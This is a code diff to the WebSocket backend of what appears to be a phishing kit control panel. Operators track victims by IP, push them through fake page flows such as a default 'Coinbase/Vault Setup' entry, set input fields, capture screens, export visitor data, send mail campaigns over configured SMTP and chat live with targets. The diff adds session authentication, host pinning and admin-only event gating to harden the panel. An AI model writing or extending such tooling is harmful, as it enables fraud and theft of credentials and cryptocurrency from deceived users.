@@ -1,5 +1,6 @@
 import { WebSocketServer, type WebSocket } from 'ws';
-import type { Server } from 'http';
+import type { Server, IncomingMessage } from 'http';
+import type { Duplex } from 'stream';
 import { serverState, type ClientEvent, type ServerEvent } from './state.js';
 import { startSimulator } from './simulator.js';
 import { addSmtpConfig, removeSmtpConfig, sendCampaign } from './mailer.js';
@@ -11,12 +12,45 @@ import {
 	dbUpsertVaultCase,
 	dbUpdateVaultCase,
 	dbDeleteVaultCase,
-	dbGetVaultCases
+	dbGetVaultCases,
+	dbSetVisitorFlowSteps,
+	dbUpsertVisitor
 } from './database.js';
+import { getSessionUser, type SessionUser } from './auth.js';
+
+const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
 
 let wss: WebSocketServer | null = null;
 const clients: Set<WebSocket> = new Set();
 let simulatorStarted = false;
+
+function parseCookie(header: string | undefined, name: string): string | undefined {
+	if (!header) return undefined;
+	for (const part of header.split(';')) {
+		const [k, ...rest] = part.trim().split('=');
+		if (k === name) return rest.join('=');
+	}
+	return undefined;
+}
+
+const ADMIN_EVENTS = new Set<string>([
+	'users:create', 'users:delete', 'users:list',
+	'domains:add', 'domains:delete',
+	'settings:update', 'settings:server', 'settings:client',
+	'profile:update', 'profile:rotate-key',
+	'flow:create', 'flow:update', 'flow:delete',
+	'mailer:send', 'mailer:smtp:add', 'mailer:smtp:remove',
+	'inbox:add', 'inbox:remove', 'inbox:refresh',
+	'vault:update', 'vault:delete',
+	'visitor:delete', 'visitors:delete',
+	'visitor:redirect', 'visitor:bypass-flow', 'visitor:set-last-two',
+	'visitor:set-email-masks', 'visitor:promote-vault', 'visitor:push',
+	'visitor:setinputs', 'visitor:screen', 'visitor:export',
+	'visitor:livechat-open', 'livechat:operator:send', 'livechat:operator:read',
+	'flow:clear', 'flow:reorder',
+	'chat:send', 'chat:delete', 'chat:list',
+	'admin:link', 'stats:request'
+]);
 
 export function broadcast(event: ServerEvent): void {
 	const message = JSON.stringify(event);
@@ -42,8 +76,12 @@ function handleClientMessage(data: string): void {
 	switch (event.type) {
 		case 'visitor:push': {
 			const { ip, targetFlow } = event.payload;
-			const visitor = serverState.pushVisitor(ip, targetFlow);
+			let visitor = serverState.pushVisitor(ip, targetFlow);
 			if (visitor) {
+				const flow = serverState.flows.find((f) => f.name === targetFlow);
+				if (flow?.steps?.length && /^[A-Z][^\/]+\/.+/.test(flow.steps[0])) {
+					visitor = serverState.setVisitorLastPage(ip, flow.steps[0]) ?? visitor;
+				}
 				const logEntry = serverState.addLogEntry(
 					`admin pushed visitor to ${targetFlow}`,
 					'action'
@@ -225,8 +263,11 @@ function handleClientMessage(data: string): void {
 			break;
 		}
 		case 'profile:update': {
+			const parts: string[] = [];
+			if (event.payload.username) parts.push('username');
+			if (event.payload.password) parts.push('password');
 			const logEntry = serverState.addLogEntry(
-				`admin updated their password`,
+				`admin updated their ${parts.length ? parts.join(' and ') : 'profile'}`,
 				'action'
 			);
 			broadcast({ type: 'log:new', payload: logEntry });
@@ -280,6 +321,19 @@ function handleClientMessage(data: string): void {
 			}
 			break;
 		}
+		case 'visitor:set-email-masks': {
+			const { ip, emailFrom, emailTo } = event.payload;
+			const visitor = serverState.setVisitorEmailMasks(ip, emailFrom || '', emailTo || '');
+			if (visitor) {
+				const logEntry = serverState.addLogEntry(
+					`admin set email masks for ${ip}: from=${emailFrom || '—'} to=${emailTo || '—'}`,
+					'action'
+				);
+				broadcast({ type: 'visitor:updated', payload: visitor });
+				broadcast({ type: 'log:new', payload: logEntry });
+			}
+			break;
+		}
 		case 'visitor:promote-vault': {
 			const { ip } = event.payload;
 			const visitor = serverState.visitors.get(ip);
@@ -291,7 +345,36 @@ function handleClientMessage(data: string): void {
 					location: [visitor.city, visitor.region].filter(Boolean).join(', '),
 					capturedBy: visitor.capturedBy
 				});
-				const logEntry = serverState.addLogEntry(`admin promoted ${ip} to Vault`, 'action');
+
+				const vaultFlow = serverState.flows.find(
+					(f) =>
+						f.active &&
+						(f.name.toLowerCase().includes('vault') ||
+							f.steps.some((s) => /vault/i.test(s)))
+				);
+				let promotedSuffix = '';
+				if (vaultFlow && vaultFlow.steps.length > 0) {
+					const firstStep = vaultFlow.steps[0];
+					if (/^[A-Z][^/]+\/.+/.test(firstStep)) {
+						visitor.flowSteps = vaultFlow.steps.map((p) => ({ page: p, passed: false }));
+						visitor.flow = vaultFlow.name;
+						visitor.flowBypassed = false;
+						try { dbSetVisitorFlowSteps(ip, visitor.flowSteps); } catch { /* non-critical */ }
+						serverState.setVisitorLastPage(ip, firstStep);
+						promotedSuffix = ` → flow "${vaultFlow.name}"`;
+					}
+				} else {
+					// No vault flow defined — default to Coinbase/Vault Setup as the entry
+					const defaultEntry = 'Coinbase/Vault Setup';
+					visitor.flowSteps = [];
+					try { dbSetVisitorFlowSteps(ip, []); } catch { /* non-critical */ }
+					serverState.setVisitorLastPage(ip, defaultEntry);
+					promotedSuffix = ` → ${defaultEntry}`;
+				}
+
+				try { dbUpsertVisitor(visitor); } catch { /* non-critical */ }
+
+				const logEntry = serverState.addLogEntry(`admin promoted ${ip} to Vault${promotedSuffix}`, 'action');
 				broadcast({ type: 'visitor:updated', payload: visitor });
 				broadcast({ type: 'vault:updated', payload: { ip } });
 				broadcast({ type: 'log:new', payload: logEntry });
@@ -384,6 +467,7 @@ function handleClientMessage(data: string): void {
 			if (visitor) {
 				visitor.flowSteps = [];
 				visitor.flow = '';
+				try { dbSetVisitorFlowSteps(visitor.ip, []); } catch { /* non-critical */ }
 				broadcast({ type: 'visitor:updated', payload: visitor });
 			}
 			break;
@@ -391,7 +475,11 @@ function handleClientMessage(data: string): void {
 		case 'flow:reorder': {
 			const visitor = serverState.visitors.get(event.payload.ip);
 			if (visitor) {
-				visitor.flowSteps = event.payload.order;
+				visitor.flowSteps = (event.payload.order || []).map((s: any) => ({
+					page: String(s.page || ''),
+					passed: !!s.passed || !/^[A-Z][^/]+\/.+/.test(String(s.page || ''))
+				}));
+				try { dbSetVisitorFlowSteps(visitor.ip, visitor.flowSteps); } catch { /* non-critical */ }
 				broadcast({ type: 'visitor:updated', payload: visitor });
 			}
 			break;
@@ -429,20 +517,56 @@ function handleClientMessage(data: string): void {
 export function setupWebSocket(server: Server): WebSocketServer {
 	if (wss) return wss;
 
-	wss = new WebSocketServer({ server, path: '/ws' });
+	wss = new WebSocketServer({ noServer: true });
 
-	wss.on('connection', (socket: WebSocket) => {
+	server.on('upgrade', (req: IncomingMessage, socket: Duplex, head: Buffer) => {
+		const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
+		if (url.pathname !== '/ws') {
+			socket.destroy();
+			return;
+		}
+
+		if (PANEL_HOST) {
+			const reqHost = (req.headers.host || '').split(':')[0].toLowerCase();
+			if (reqHost !== PANEL_HOST) {
+				socket.destroy();
+				return;
+			}
+		}
+
+		const token = parseCookie(req.headers.cookie, 'panel_session');
+		const user = getSessionUser(token);
+		if (!user) {
+			socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
+			socket.destroy();
+			return;
+		}
+
+		wss!.handleUpgrade(req, socket, head, (ws) => {
+			wss!.emit('connection', ws, req, user);
+		});
+	});
+
+	wss.on('connection', (socket: WebSocket, _req: IncomingMessage, user: SessionUser) => {
 		clients.add(socket);
 
 		const initPayload = serverState.getInitPayload();
 		socket.send(JSON.stringify({ type: 'init', payload: initPayload }));
 
-		const logEntry = serverState.addLogEntry('Client admin signed in', 'connect');
+		const logEntry = serverState.addLogEntry(`${user.username} signed in`, 'connect');
 		broadcast({ type: 'log:new', payload: logEntry });
 		broadcastStats();
 
 		socket.on('message', (raw) => {
-			handleClientMessage(raw.toString());
+			const data = raw.toString();
+			let parsed: ClientEvent;
+			try { parsed = JSON.parse(data); } catch { return; }
+
+			if (ADMIN_EVENTS.has(parsed.type) && user.role !== 'admin') {
+				return;
+			}
+
+			handleClientMessage(data);
 		});
 
 		socket.on('close', () => {
